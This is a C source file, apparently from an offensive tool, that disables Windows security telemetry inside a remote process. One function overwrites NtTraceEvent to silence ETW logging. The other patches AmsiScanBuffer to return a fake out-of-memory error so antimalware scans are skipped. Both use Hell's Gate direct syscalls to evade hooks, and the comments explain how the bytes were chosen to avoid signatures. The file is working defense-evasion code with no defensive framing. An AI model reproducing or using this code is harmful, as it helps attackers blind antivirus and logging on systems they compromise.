#include <windows.h>
#include <stdio.h>
#include <psapi.h>
#include <wchar.h>

#include <patches/patch.h>
#include <syscall/HellsGate.h>
#include <enum/enum.h>
#include <util/util.h>

#ifdef NOETW
bool patchETW_remote(HANDLE hProcess, VX_TABLE vx_table)
{

    NTSTATUS status = 0x00000000;
    int offset = 3;
    FARPROC pNtTraceEvent = vx_table.NtTraceEvent.pAddress;
    if (!pNtTraceEvent)
    {
        fail("Hells Gate failed to resolve address for NtTraceEvent: %d", GetLastError());
        return false;
    }
    // Remote address for NtTraceEvent
    LPVOID remoteNtTraceEvent = (LPVOID)((DWORD_PTR)pNtTraceEvent);
    ULONG oldProtect = 0;
    SIZE_T bytesWritten = 0;

    // Patch bytes
    BYTE patch[] = {0x90, 0x90, 0x90, 0xC3}; // nop nop nop ret

    // Change memory protection
    LPVOID targetAddress = (LPVOID)((DWORD_PTR)remoteNtTraceEvent + offset);
    SIZE_T regionSize = sizeof(patch);
    HellsGate(vx_table.NtProtectVirtualMemory.wSystemCall);
    status = HellDescent(hProcess, &targetAddress, &regionSize, PAGE_EXECUTE_READWRITE, &oldProtect);
    if (status != 0)
    {
        fail("Hell's Gate NtProtectVirtualMemory failed with status: 0x%08X", status);
        return false;
    }

    HellsGate(vx_table.NtWriteVirtualMemory.wSystemCall);
    status = HellDescent(hProcess, (BYTE *)remoteNtTraceEvent + offset, patch, sizeof(patch), &bytesWritten);
    // VxMoveMem doesnt work as its a remote process
    if (status != 0)
    {
        fail("WriteVirtualMemory failed with status: 0x%08X", status);
        CloseHandle(hProcess);
        return false;
    }

    // Restore memory protection
    targetAddress = (LPVOID)((DWORD_PTR)remoteNtTraceEvent + 3);
    regionSize = sizeof(patch);
    HellsGate(vx_table.NtProtectVirtualMemory.wSystemCall);
    status = HellDescent(hProcess, &targetAddress, &regionSize, oldProtect, &oldProtect);
    if (status != 0)
    {
        fail("Hell's Gate NtProtectVirtualMemory restore failed with status: 0x%08X", status);
        return false;
    }

    okay("Patched NtTraceEvent in remote process");
    return true;
}
#endif

#ifdef NOAMSI
bool patchAMSI_remote(HANDLE hProcess, VX_TABLE vx_table)
{

    // Force load amsi.dll in our process first
    NTSTATUS status = 0x00000000;
    HMODULE hAMSI = LoadLibraryW(L"amsi.dll");
    if (!hAMSI)
    {
        fail("LoadLibraryW failed for amsi.dll: %d", GetLastError());
        return false;
    }

    FARPROC pAmsiScanBuf = GetProcAddress(hAMSI, "AmsiScanBuffer");
    if (!pAmsiScanBuf)
    {
        fail("GetProcAddress failed for AmsiScanBuffer and returned with error: %d", GetLastError());
        return false;
    }
    info("Address of AmsiScanBuffer: %p", pAmsiScanBuf);

    // Find remote base address of amsi.dll in the target process
    HMODULE hMods[1024];
    DWORD cbNeeded;
    LPVOID pRemoteAmsiScanBuf = NULL;
    ULONG oldProtect = 0;
    SIZE_T bytesWritten = 0;

    ////////////////////////////////////////////////
    // This function works now, idk how, do not touch it
    if (EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded))
    {
        for (unsigned int i = 0; i < (cbNeeded / sizeof(HMODULE)); i++)
        {
            WCHAR szModName[MAX_PATH];
            if (GetModuleBaseNameW(hProcess, hMods[i], szModName, MAX_PATH))
            {
                if (_wcsicmp(szModName, L"amsi.dll") == 0)
                {
                    // Calculate offset of AmsiScanBuffer in local process
                    SIZE_T offset = (SIZE_T)pAmsiScanBuf - (SIZE_T)hAMSI;
                    pRemoteAmsiScanBuf = (LPVOID)((SIZE_T)hMods[i] + offset);
                    info("Found amsi.dll in remote process at: %p, AmsiScanBuffer at: %p", hMods[i], pRemoteAmsiScanBuf);
                    break;
                }
            }
        }
    }
    ////////////////////////////////////////////////
    if (!pRemoteAmsiScanBuf)
    {
        fail("Failed to find remote AmsiScanBuffer address even after injection");
        return false;
    }
    // We want to patch the beginning to MOV EAX, 0x8007000E RET
    // 0x800700E is the error code for OutOfMemory, probably more legitimate than popular access denied
    // The order is LE, we also add some nops, as the default may be signatured

    // Move patch to memory
    BYTE patch[] = {0xB8, 0x0E, 0x00, 0x07, 0x80, 0x90, 0x90, 0x90, 0xC3};

    // Change memory protection using Hell's Gate
    LPVOID targetAddress = pRemoteAmsiScanBuf;
    SIZE_T regionSize = sizeof(patch);
    HellsGate(vx_table.NtProtectVirtualMemory.wSystemCall);
    status = HellDescent(hProcess, &targetAddress, &regionSize, PAGE_EXECUTE_READWRITE, &oldProtect);
    if (status != 0)
    {
        fail("Hell's Gate NtProtectVirtualMemory failed with status: 0x%08X", status);
        return false;
    }

    HellsGate(vx_table.NtWriteVirtualMemory.wSystemCall);
    status = HellDescent(hProcess, pRemoteAmsiScanBuf, patch, sizeof(patch), &bytesWritten);
    if (status != 0)
    {
        fail("WriteVirtualMemory failed with status: 0x%08X", status);
        CloseHandle(hProcess);
        return false;
    }

    // Restore memory protection using Hell's Gate
    targetAddress = pRemoteAmsiScanBuf;
    regionSize = sizeof(patch);
    HellsGate(vx_table.NtProtectVirtualMemory.wSystemCall);
    status = HellDescent(hProcess, &targetAddress, &regionSize, oldProtect, &oldProtect);
    if (status != 0)
    {
        fail("Hell's Gate NtProtectVirtualMemory restore failed with status: 0x%08X", status);
        return false;
    }
    okay("Patched AmsiScanBuffer successfully");
    return true;
}
#endif